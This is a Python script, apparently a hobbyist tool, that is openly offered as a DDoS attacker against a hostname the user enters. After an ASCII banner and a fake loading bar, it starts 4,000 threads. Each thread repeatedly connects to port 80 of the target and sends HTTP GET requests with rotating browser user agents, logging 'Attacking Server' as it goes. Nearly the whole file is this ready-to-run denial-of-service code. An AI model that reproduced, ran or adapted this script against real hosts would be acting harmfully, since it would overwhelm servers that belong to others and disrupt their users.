# ____        _____   ____  _____ ____ ____   ___ ____   ___  
#|  _ \ _   _|___ /  / ___|| ____/ ___|___ \ / _ \___ \ / _ \ 
#| |_) | | | | |_ \  \___ \|  _|| |     __) | | | |__) | | | |
#|  __/| |_| |___) |  ___) | |__| |___ / __/| |_| / __/| |_| |
#|_|    \__, |____/  |____/|_____\____|_____|\___/_____|\___/ 
#       |___/                                                 
# ____  ____   ___  ____       _  _____ _____  _    ____ _  _______ ____  
#|  _ \|  _ \ / _ \/ ___|     / \|_   _|_   _|/ \  / ___| |/ / ____|  _ \ 
#| | | | | | | | | \___ \    / _ \ | |   | | / _ \| |   | ' /|  _| | |_) |
#| |_| | |_| | |_| |___) |  / ___ \| |   | |/ ___ \ |___| . \| |___|  _ < 
#|____/|____/ \___/|____/  /_/   \_\_|   |_/_/   \_\____|_|\_\_____|_| \_\
#                                                                         
#
#
#----------------------------------------------------------------------------------------------                                               
# coded by Arijit Bhowmick
#
# 8ae503b206749490f1a2a2b4fe281331903625132f5f207554423c950111fa24
#
#--------------------------------------------------------------------------------------------


import threading
import socket 
import sys,random
import time
import os
from datetime import datetime

#**********************************************************************************
#							Text Colour
#**********************************************************************************
#**********************************************************************************
color = '\033[32m' #colour == blue						For  terminal
color_socket_error = '\033[91m' # colour == red			For  terminal
#**********************************************************************************
#  If you want to run this ddos attacker in windows then 
#	comment line->89
#	and uncomment line->90
#**********************************************************************************

agent = []
agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
data = '''
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive'''

#**********************************************************************************
site = input(str('enter the hostname --> '))	# hostname/host_ipaddress
port = 80			# port to wich the ddos attack will be done
#**********************************************************************************

t = [None] *2000
a = [None] *2000
l = [None] *2000

#**********************************************************************************

now = datetime.now()		# Assining Date_Time
hour = now.hour				# hour
minute = now.minute			# minute
day = now.day				# day
month = now.month			# month
year = now.year				# year
sec = now.second			# second

#**********************************************************************************

print('''\033[34m
 ____  _             _   _                  _   _   _             _    
░██████╗████████╗░█████╗░██████╗░████████╗██╗███╗░░██╗░██████╗░  ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██║████╗░██║██╔════╝░  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
╚█████╗░░░░██║░░░███████║██████╔╝░░░██║░░░██║██╔██╗██║██║░░██╗░  ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
░╚═══██╗░░░██║░░░██╔══██║██╔══██╗░░░██║░░░██║██║╚████║██║░░╚██╗  ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██████╔╝░░░██║░░░██║░░██║██║░░██║░░░██║░░░██║██║░╚███║╚██████╔╝  ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░  ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝


\033[34m''')
print('\033[36m'+'on',site,'\nSystem Time : -> ',year,'year',month,'month',day,'day',hour,'hour',minute,'minute',sec,'seconds'+'\033[36m')
print ('\033[35m'+"\nIf you want to stop the process please 'close the window' or 'press ctrl+c to break/terminate the process'"+'\033[35m')
os.system("echo '\e[5mLOADING  \e[25m'" )
#print('LOADING')
time.sleep(6)
print ("[====================] 100%")

#**********************************************************************************

def ddos1():
	while 1:
		try:
			s = socket.socket()
			s.connect((site, port))
			packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
			s.sendto(packet, (site, port))	
			s.send(packet)
			print(color+time.ctime(time.time()) + ' Attacking Server->'+site+color)
		except socket.error:
			print(color_socket_error+time.ctime(time.time()) + ' Attacking Server->'+site+color_socket_error)	# socket connection error prompt
			exit(1)
#**********************************************************************************

def ddos2():
	while 1:
		ddos1()
#**********************************************************************************

for i in range(2000):
	t[i] = threading.Thread(target=ddos1)
for j in range(2000):
	l[j] = threading.Thread(target=ddos2)
for k in range(2000):
	t[k].start()
	l[k].start()